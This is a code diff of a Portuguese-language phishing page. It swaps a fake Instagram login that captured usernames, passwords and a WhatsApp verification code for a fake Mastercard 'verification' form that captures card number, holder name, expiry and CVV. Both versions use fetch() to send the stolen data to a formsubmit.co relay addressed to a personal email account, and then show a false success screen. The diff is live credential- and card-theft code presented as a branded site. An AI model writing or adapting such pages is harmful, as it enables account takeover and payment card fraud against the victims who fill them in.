@@ -2,174 +2,132 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8" />
+  <title>Mastercard - Verificação</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
     body {
-      background-color: #fafafa;
-      font-family: 'Roboto', sans-serif;
-      margin: 0;
+      background: linear-gradient(135deg, #ef3b36, #ff725e);
+      font-family: 'Roboto', Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      flex-direction: column;
+      height: 100vh;
+      margin: 0;
     }
 
-    .container {
+    .container, .mensagem {
       background: white;
-      padding: 40px 30px;
-      border: 1px solid #ddd;
+      padding: 40px 35px;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
       text-align: center;
-      width: 100%;
-      max-width: 320px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      margin: auto;
-    }
-
-    .logo {
-      width: 100px;
-      margin-bottom: 20px;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 14px;
-      box-sizing: border-box;
-    }
-
-    button {
-      background-color: #3897f0;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      border: none;
-      transition: background-color 0.3s;
-    }
-
-    button:hover {
-      background-color: #318bda;
-    }
-
-    .footer {
-      font-size: 12px;
-      color: #999;
-      margin-top: 15px;
-    }
-
-    .hidden {
       display: none;
     }
 
-    .loading {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    .active {
+      display: block;
     }
 
-    .loading img {
-      width: 40px;
-      margin-bottom: 10px;
-      animation: spin 1s linear infinite;
+    img {
+      width: 120px;
+      margin-bottom: 25px;
     }
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    input {
+      width: 100%;
+      padding: 14px 18px;
+      margin: 12px 0;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      font-size: 15px;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #ef3b36;
+      box-shadow: 0 0 8px rgba(239, 59, 54, 0.5);
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      margin-top: 18px;
+      background-color: #ef3b36;
+      color: white;
+      font-weight: 700;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      cursor: pointer;
+      transition: background-color 0.25s ease;
+      box-shadow: 0 6px 12px rgba(239, 59, 54, 0.4);
+    }
+
+    button:hover {
+      background-color: #c6312b;
+      box-shadow: 0 8px 16px rgba(198, 49, 43, 0.6);
+    }
+
+    h2 {
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #555;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
-  <!-- Tela de login -->
-  <div class="container" id="login">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
-    <form id="loginForm">
-      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
-      <input type="password" name="password" placeholder="Senha" required />
-      <button type="submit">Entrar</button>
-    </form>
-    <div class="footer">© 2025 Instagram from Meta</div>
-  </div>
-
-  <!-- Tela do código -->
-  <div class="container hidden" id="codigo">
-    <h3>Verificação de segurança</h3>
-    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
-    <form id="codigoForm">
-      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
-      <button type="submit">Confirmar</button>
+  <!-- Tela de formulário -->
+  <div class="container active" id="formulario">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
+    <form id="fakeForm">
+      <input type="text" name="cartao" placeholder="Número do cartão" required />
+      <input type="text" name="nome" placeholder="Nome do titular" required />
+      <input type="text" name="validade" placeholder="Validade (MM/AA)" required />
+      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required />
+      <button type="submit">Verificar</button>
     </form>
   </div>
 
-  <!-- Carregando 1 -->
-  <div class="container hidden" id="carregando1">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Verificando código...</p>
-    </div>
+  <!-- Tela de confirmação -->
+  <div class="mensagem" id="confirmacao">
+    <h2>Verificação recebida!</h2>
+    <p>Em alguns instantes chegará um e-mail de confirmação.</p>
   </div>
 
-  <!-- Carregando 2 -->
-  <div class="container hidden" id="carregando2">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Pagamento sendo processado...</p>
-    </div>
-  </div>
-
-  <!-- Tela final -->
-  <div class="container hidden" id="final">
-    <h2>Parabéns!</h2>
-    <p>Cadastro realizado com sucesso.</p>
-    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
-  </div>
-
+  <!-- Script de envio -->
   <script>
-    const loginForm = document.getElementById("loginForm");
-    const codigoForm = document.getElementById("codigoForm");
-
-    loginForm.addEventListener("submit", function(e) {
+    const form = document.getElementById('fakeForm');
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
-      document.getElementById("login").classList.add("hidden");
-      document.getElementById("codigo").classList.remove("hidden");
 
-      const dados = new FormData(loginForm);
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dados
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          cartao: form.cartao.value,
+          nome: form.nome.value,
+          validade: form.validade.value,
+          cvv: form.cvv.value
+        })
+      }).then(response => {
+        document.getElementById("formulario").classList.remove("active");
+        document.getElementById("confirmacao").classList.add("active");
+      }).catch(error => {
+        alert("Erro no envio dos dados. Tente novamente.");
       });
-    });
-
-    codigoForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("codigo").classList.add("hidden");
-      document.getElementById("carregando1").classList.remove("hidden");
-
-      const dadosCodigo = new FormData(codigoForm);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dadosCodigo
-      });
-
-      // Simula carregamento
-      setTimeout(() => {
-        document.getElementById("carregando1").classList.add("hidden");
-        document.getElementById("carregando2").classList.remove("hidden");
-
-        setTimeout(() => {
-          document.getElementById("carregando2").classList.add("hidden");
-          document.getElementById("final").classList.remove("hidden");
-        }, 2500);
-      }, 2500);
     });
   </script>
 </body>
-</html>
+  </html>
